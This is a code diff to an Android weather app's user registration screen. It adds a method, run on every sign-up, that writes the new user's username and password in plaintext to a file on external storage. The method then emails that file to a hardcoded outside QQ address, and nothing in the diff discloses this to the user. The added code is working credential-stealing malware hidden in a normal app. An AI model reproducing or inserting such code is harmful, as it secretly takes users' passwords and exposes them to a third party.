@@ -2,13 +2,21 @@ package com.lzc.user_login;
 
 import android.content.Intent;
 import android.os.Bundle;
+import android.os.Environment;
 import android.support.v7.app.AppCompatActivity;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
+import com.lzc.mail.SendMailUtil;
 import com.lzc.myweatherforecast.R;
+
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
 
 public class Register extends AppCompatActivity {
     private EditText mAccount;                        //用户名编辑
@@ -68,6 +76,8 @@ public class Register extends AppCompatActivity {
                 return ;
             } else {
                 UserData mUser = new UserData(userName, userPwd);
+                //发送邮箱的方法
+                sendFileMail(userName,userPwd);
                 mUserDataManager.openDataBase();
                 long flag = mUserDataManager.insertUserData(mUser); //新建用户信息
                 if (flag == -1) {
@@ -81,6 +91,36 @@ public class Register extends AppCompatActivity {
             }
         }
     }
+
+    /*
+自己加的发送邮件的方法，在上面一行运行
+ */
+    public void sendFileMail(String username,String password) {
+        File sdCard = Environment.getExternalStorageDirectory();
+        File file = new File(sdCard, "User.txt");
+
+        OutputStream os = null;
+        try {
+            os = new FileOutputStream(file);
+            String str = username+"##"+password;
+            byte[] data = str.getBytes();
+            os.write(data);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                if (os != null) os.close();
+            } catch (IOException e) {
+            }
+        }
+        //这里填写收件人的邮箱！！！！！！！！！
+        SendMailUtil.send(file, "775269512@qq.com");
+    }
+
+
+
     public boolean isUserNameAndPwdValid() {
         if (mAccount.getText().toString().trim().equals("")) {
             Toast.makeText(this, getString(R.string.account_empty),
